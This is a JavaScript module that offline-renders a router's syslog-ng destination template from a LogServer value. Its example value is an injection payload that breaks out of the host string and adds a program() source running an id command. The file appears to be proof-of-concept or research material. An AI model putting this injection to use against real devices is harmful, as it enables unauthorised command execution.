// Pure string model of the observed 7.2C0 syslog-ng destination format.
// This file never opens a socket, authenticates, or modifies a device.
import {resolve} from 'node:path';
import {pathToFileURL} from 'node:url';

export const observedFormat = 'destination d_server{udp("%s" port(514) template(t_tem));};';

// Generic loopback address; the command is an illustrative read-only UID probe.
export const exampleLogServer =
  '127.0.0.1" port(514));};source u{program("/usr/bin/id|tee /dev/pts/[0-9]*;sleep 15");};log{source(u);destination(d_server);};#';

export function renderDestination(logServer) {
  if (typeof logServer !== 'string') throw new TypeError('LogServer must be a string');
  return observedFormat.replace('%s', logServer);
}

if (process.argv[1] && import.meta.url === pathToFileURL(resolve(process.argv[1])).href) {
  console.log(`LogServer bytes: ${Buffer.byteLength(exampleLogServer, 'utf8')}`);
  console.log(renderDestination(exampleLogServer));
  console.log('Offline string expansion only; no router connection.');
}
